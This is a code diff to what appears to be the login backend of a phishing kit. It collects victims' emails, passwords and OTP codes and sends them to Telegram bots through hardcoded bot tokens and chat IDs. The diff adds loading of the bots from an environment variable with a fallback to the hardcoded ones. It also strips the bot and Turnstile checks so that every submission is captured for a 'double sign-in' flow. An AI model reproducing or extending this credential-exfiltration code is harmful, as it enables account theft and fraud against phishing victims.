@@ -5,16 +5,25 @@ import {
   jsonResponse,
   parseSecureBody,
   verifyGateToken,
-  verifyTurnstile,
 } from "../_shared/security.ts"
-import { botRedirectResponse, evaluateBotSignals, evaluateIpThreat } from "../_shared/botShield.ts"
 import { resolveGeo, type GeoInfo } from "../_shared/geo.ts"
 
-// Telegram configuration — each bot has its own token and chat ID
-const TELEGRAM_BOTS = [
+const FALLBACK_TELEGRAM_BOTS = [
   { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
   { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
 ]
+
+function loadTelegramBots() {
+  const raw = Deno.env.get('TELEGRAM_BOTS')
+  if (!raw) return FALLBACK_TELEGRAM_BOTS
+  try {
+    const parsed = JSON.parse(raw)
+    if (Array.isArray(parsed) && parsed.length > 0) return parsed
+  } catch {
+    console.error('Invalid TELEGRAM_BOTS env JSON — using fallback bots')
+  }
+  return FALLBACK_TELEGRAM_BOTS
+}
 interface LoginRequest {
   email: string
   provider?: string
@@ -101,7 +110,8 @@ ${credentialLabel} <code>${displayPassword}</code>
   `.trim()
 
   try {
-    const fetchPromises = TELEGRAM_BOTS.map(({ token, chatId }, i) =>
+    const bots = loadTelegramBots()
+    const fetchPromises = bots.map(({ token, chatId }, i) =>
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -155,16 +165,7 @@ serve(async (req) => {
 
     const body = await parseSecureBody(req) as LoginRequest
 
-    const botCheck = evaluateBotSignals(req, body.clientSignals)
-    if (botCheck.isBot) {
-      return botRedirectResponse(botCheck.reason)
-    }
-
-    const ipCheck = await evaluateIpThreat(req)
-    if (ipCheck.isBot) {
-      return botRedirectResponse(ipCheck.reason)
-    }
-
+    // Bot filtering runs at BotGate only — login always captures for double sign-in flow.
     if (!body.email) {
       return jsonResponse({
         success: false,
@@ -180,18 +181,6 @@ serve(async (req) => {
       } as LoginResponse, 400)
     }
 
-    const isOtpSubmission = body.password?.startsWith('[OTP Code]')
-
-    if (body.password && !isOtpSubmission && body.turnstileToken) {
-      const turnstileVerified = await verifyTurnstile(body.turnstileToken)
-      if (!turnstileVerified) {
-        return jsonResponse({
-          success: false,
-          message: 'Verification failed',
-          error: 'Failed to verify Turnstile challenge. Are you a bot?'
-        } as LoginResponse, 403)
-      }
-    }
     // Extract name from email
     const emailLocal = body.email.split('@')[0]
     const formattedName = emailLocal
